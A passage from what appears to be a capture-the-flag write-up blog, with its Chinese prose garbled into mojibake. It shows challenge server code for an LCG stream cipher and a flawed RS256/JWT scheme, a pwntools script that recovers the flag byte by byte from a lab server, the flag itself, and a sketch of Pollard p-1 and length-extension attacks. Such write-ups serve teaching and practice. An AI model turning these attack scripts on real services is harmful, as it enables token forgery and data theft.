class="variable language_">self</span>.seed.to_bytes(<span class="variable language_">self</span>.nbyte, byteorder=<span class="string">"big"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rpng: PRNG</span>):</span><br><span class="line">        <span class="variable language_">self</span>.rpng = copy.copy(rpng)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(pt ^ key <span class="keyword">for</span> pt, key <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, <span class="variable language_">self</span>.rpng.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_server</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./server.py"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    lcg = LCG()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"flag: <span class="subst">{Cipher(lcg).encrypt(FLAG.encode()).<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; encrypt"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; server.py"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; exit"</span>)</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">"&gt; Command: "</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"exit"</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"encrypt"</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">"&gt; Enter plaintext: "</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"enc: <span class="subst">{Cipher(lcg).encrypt(plaintext.encode()).<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"server.py"</span>:</span><br><span class="line">            read_server()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bad hacker"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥ byte by byte çš„å¾—åˆ° flagï¼Œå°±ä¸€å€‹å€‹è¿­ä»£å°±å¯ä»¥å¾—åˆ° flag ã„Œ</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¼ºæœå™¨è³‡è¨Š</span></span><br><span class="line">HOST, PORT = <span class="string">"lab.scist.org"</span>, <span class="number">31416</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹ flag çŒœæ¸¬</span></span><br><span class="line">flag_guess = <span class="string">"SCIST{"</span></span><br><span class="line">charset = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&amp;*()-=+}{[]:;\"'&lt;&gt;,.?/|\\`~ "</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encrypted_flag</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="string">""" å–å¾—åŠ å¯†çš„ flag """</span></span><br><span class="line">    conn.recvuntil(<span class="string">b"flag: "</span>)</span><br><span class="line">    encrypted_flag = <span class="built_in">bytes</span>.fromhex(conn.recvline().strip().decode())</span><br><span class="line">    <span class="keyword">return</span> encrypted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_known_plaintext</span>(<span class="params">conn, plaintext</span>):</span><br><span class="line">    <span class="string">""" åŠ å¯†å·²çŸ¥æ˜æ–‡ï¼Œç²å– PRNG ç”¢ç”Ÿçš„å¯†é‘° """</span></span><br><span class="line">    conn.sendlineafter(<span class="string">b"&gt; Command: "</span>, <span class="string">b"encrypt"</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">b"&gt; Enter plaintext: "</span>, plaintext.encode())</span><br><span class="line">    conn.recvuntil(<span class="string">b"enc: "</span>)</span><br><span class="line">    encrypted = <span class="built_in">bytes</span>.fromhex(conn.recvline().strip().decode())</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_flag</span>():</span><br><span class="line">    <span class="keyword">global</span> flag_guess</span><br><span class="line"></span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line">    <span class="comment"># conn = process(['python3', 'server.py'])</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å–å¾—å¯†æ–‡ flag</span></span><br><span class="line">    encrypted_flag = get_encrypted_flag(conn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Encrypted Flag: <span class="subst">{encrypted_flag.<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å˜—è©¦é€å­—è§£å¯†</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            test_plaintext = flag_guess + char  <span class="comment"># æ¸¬è©¦ç•¶å‰çŒœæ¸¬</span></span><br><span class="line">            encrypted = encrypt_known_plaintext(conn, test_plaintext)  <span class="comment"># å–å¾—å°æ‡‰åŠ å¯†çµæœ</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># XOR flag_guess çš„éƒ¨åˆ†ï¼Œçœ‹çœ‹æ˜¯å¦èˆ‡ flag ç›¸åŒ</span></span><br><span class="line">            <span class="keyword">if</span> encrypted[:<span class="built_in">len</span>(test_plaintext)] == encrypted_flag[:<span class="built_in">len</span>(test_plaintext)]:</span><br><span class="line">                flag_guess += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[+] Found: <span class="subst">{flag_guess}</span>"</span>)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found <span class="keyword">or</span> flag_guess.endswith(<span class="string">"}"</span>):  <span class="comment"># çµæŸæ¢ä»¶</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Final Flag: <span class="subst">{flag_guess}</span>"</span>)</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    brute_force_flag()</span><br></pre></td></tr></tbody></table></figure><p>flag:<code>SCIST{using linear congruential generator to implement a stream cipher}</code></p><h3 id="rs256---é¦–æ®º">RS256 - é¦–æ®º / <a href="#rs256---é¦–æ®º" class="headerlink"></a></h3><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> abc</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Random.random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, inverse, isPrime, long_to_bytes, size</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RsaKey</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        p = <span class="variable language_">self</span>.get_forward_prime()</span><br><span class="line">        q = <span class="variable language_">self</span>.get_backward_prime()</span><br><span class="line">        <span class="variable language_">self</span>.n = p * q * (q + <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">self</span>.e = <span class="number">0x10001</span></span><br><span class="line">        <span class="variable language_">self</span>.d = inverse(<span class="variable language_">self</span>.e, (p - <span class="number">1</span>) * (q ** <span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_forward_prime</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> size(p) &lt; <span class="number">527</span>:</span><br><span class="line">                p *= getPrime(randrange(<span class="number">4</span>, <span class="number">17</span>))</span><br><span class="line">            <span class="keyword">if</span> isPrime(p + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> p + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_backward_prime</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = getPrime(<span class="number">240</span>)</span><br><span class="line">            <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(p + <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">public_key</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps({<span class="string">"e"</span>: <span class="variable language_">self</span>.e, <span class="string">"n"</span>: <span class="variable language_">self</span>.n})</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">private_key</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps({<span class="string">"d"</span>: <span class="variable language_">self</span>.d, <span class="string">"n"</span>: <span class="variable language_">self</span>.n})</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(message), <span class="variable language_">self</span>.d, <span class="variable language_">self</span>.n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> message == long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(signature), <span class="variable language_">self</span>.e, <span class="variable language_">self</span>.n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JWT256</span>(abc.ABC):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = secret</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">alg</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__class__.__name__.encode()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">self</span>) -&gt; datetime.timedelta:</span><br><span class="line">        <span class="keyword">return</span> datetime.timedelta(minutes=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">typ</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"JWT256"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64encode</span>(<span class="params">cls, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        data = base64.b64encode(data).decode()</span><br><span class="line">        data = data.replace(<span class="string">"+"</span>, <span class="string">"-"</span>).replace(<span class="string">"/"</span>, <span class="string">"_"</span>)</span><br><span class="line">        <span class="keyword">return</span> data.rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64decode</span>(<span class="params">cls, data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        data = data.replace(<span class="string">"-"</span>, <span class="string">"+"</span>).replace(<span class="string">"_"</span>, <span class="string">"/"</span>)</span><br><span class="line">        data = data + <span class="string">"="</span> * (-<span class="built_in">len</span>(data) % <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(data.encode())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">cls, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dict</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> item: item.split(<span class="string">b"="</span>, <span class="number">1</span>), data.split(<span class="string">b"&amp;"</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unparse</span>(<span class="params">cls, data: <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"&amp;"</span>.join(<span class="built_in">map</span>(<span class="string">b"="</span>.join, data.items()))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, payload: <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        header = <span class="variable language_">self</span>.generate_header()</span><br><span class="line">        body = <span class="variable language_">self</span>.generate_body(payload)</span><br><span class="line">        signature = <span class="variable language_">self</span>.generate_signature(header + <span class="string">b"."</span> + body)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"."</span>.join(<span class="variable language_">self</span>.base64encode(payload) <span class="keyword">for</span> payload <span class="keyword">in</span> (header, body, signature))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, token: <span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">list</span>[<span class="built_in">bytes</span>]]:</span><br><span class="line">        header, body, signature = <span class="built_in">tuple</span>(<span class="variable language_">self</span>.base64decode(payload) <span class="keyword">for</span> payload <span class="keyword">in</span> token.split(<span class="string">"."</span>))</span><br><span class="line">        <span class="variable language_">self</span>.verify_header(header)</span><br><span class="line">        <span class="variable language_">self</span>.verify_body(body)</span><br><span class="line">        <span class="variable language_">self</span>.verify_signature(header + <span class="string">b"."</span> + body, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.parse(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_body</span>(<span class="params">self, payload: <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        payload[<span class="string">b"iat"</span>] = <span class="string">f"<span class="subst">{<span class="built_in">int</span>(datetime.datetime.now().timestamp())}</span>"</span>.encode()</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.unparse(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_header</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        payload = {<span class="string">b"alg"</span>: <span class="variable language_">self</span>.alg, <span class="string">b"typ"</span>: <span class="variable language_">self</span>.typ}</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.unparse(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(<span class="variable language_">self</span>.secret + message).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_body</span>(<span class="params">self, body: <span class="built_in">bytes</span></span>):</span><br><span class="line">        issued_at = <span class="built_in">int</span>(<span class="variable language_">self</span>.parse(body)[<span class="string">b"iat"</span>].decode())</span><br><span class="line">        <span class="keyword">if</span> datetime.datetime.fromtimestamp(issued_at) + <span class="variable language_">self</span>.exp &lt; datetime.datetime.now():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify body failed."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_header</span>(<span class="params">self, header: <span class="built_in">bytes</span></span>):</span><br><span class="line">        payload = <span class="variable language_">self</span>.parse(header)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="variable language_">self</span>.alg == payload[<span class="string">b"alg"</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.typ == payload[<span class="string">b"typ"</span>]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify header failed."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.generate_signature(message) != signature:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify signature failed."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RS256</span>(<span class="title class_ inherited__">JWT256</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret: <span class="built_in">bytes</span>, key: RsaKey</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(secret)</span><br><span class="line">        <span class="variable language_">self</span>.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.key.sign(<span class="built_in">super</span>().generate_signature(message))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.key.verify(<span class="built_in">super</span>().generate_signature(message), signature):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify signature failed."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_server</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./server.py"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    provider = RS256(os.urandom(randrange(<span class="number">37</span>, <span class="number">43</span>)), RsaKey())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"public_key: <span class="subst">{provider.key.public_key}</span>"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; register"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; login"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; server.py"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; exit"</span>)</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">"&gt; Command: "</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"exit"</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"register"</span>:</span><br><span class="line">            username = <span class="built_in">input</span>(<span class="string">"&gt; Input username: "</span>).strip()</span><br><span class="line">            token = provider.encode({<span class="string">b"username"</span>: username.encode(), <span class="string">b"admin"</span>: <span class="string">b"N"</span>})</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Hi <span class="subst">{username}</span>, your token is: <span class="subst">{token}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"login"</span>:</span><br><span class="line">            data = provider.decode(<span class="built_in">input</span>(<span class="string">"&gt; Input token: "</span>).strip())</span><br><span class="line">            username = data[<span class="string">b"username"</span>].decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Hi <span class="subst">{username}</span>."</span>)</span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">b"admin"</span>] == <span class="string">b"Y"</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"Administrator can read the flag: <span class="subst">{FLAG}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"server.py"</span>:</span><br><span class="line">            read_server()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bad hacker"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Login failed."</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>é€™é¡Œè¶…ç´šéº»ç…©ï¼Œè¦æ§‹é€ ä¸€çµ„ token ä½¿å¾— JWT é©—è­‰å‡ºä¾† header æ­£ç¢ºï¼Œ bodyæ­£ç¢ºï¼ˆåœ¨æœ‰æ•ˆæ™‚é–“ï¼‰ï¼Œ signature æ­£ç¢ºï¼Œå…¶ä¸­ signature æ˜¯æŠŠ header å’Œ bodysha256 å¾Œå†åšä¸€æ¬¡ RSA åŠ å¯†ï¼Œä¸éåŸç†å€’æ˜¯ä¸é›£ï¼Œå› ç‚º RSA <code>p-1</code>æ˜¯ smooth çš„ï¼Œå¯ä»¥ç”¨ Pollardâ€™s p-1 factorization æ”»æ“Šï¼Œsha256 è¦ hashçš„æ˜¯ secret + {header + â€˜.â€™ + body} ï¼Œå› ç‚º praseæ™‚å¾Œé¢å¦‚æœæœ‰è·Ÿå‰é¢ç›¸åŒçš„éµå€¼æœƒè“‹æ‰å‰é¢çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨ LEA æ”»æ“Šï¼Œ 